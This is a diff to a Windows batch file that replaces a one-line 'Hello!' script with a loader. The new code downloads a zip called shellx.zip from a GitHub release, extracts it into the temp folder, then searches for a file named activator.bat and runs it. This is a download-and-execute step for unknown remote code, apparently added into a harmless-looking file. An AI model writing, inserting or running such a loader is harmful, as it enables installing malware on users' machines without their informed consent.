@@ -1,3 +1,30 @@
 @echo off
-echo Hello!
+setlocal
+
+set "URL=https://github.com/achill0/shell/releases/download/download/shellx.zip"
+set "ZIP=%TEMP%\package.zip"
+set "DEST=%TEMP%\package_extracted"
+
+echo Downloading ZIP...
+curl -fL "%URL%" -o "%ZIP%" || goto error
+
+echo Extracting ZIP...
+if not exist "%DEST%" mkdir "%DEST%"
+tar -xf "%ZIP%" -C "%DEST%" || goto error
+
+echo Looking for activator.bat...
+for /r "%DEST%" %%F in (activator.bat) do (
+    echo Launching: %%F
+    call "%%F"
+    goto done
+)
+
+echo activator.bat was not found.
+goto done
+
+:error
+echo Download or extraction failed.
+
+:done
 pause
+endlocal
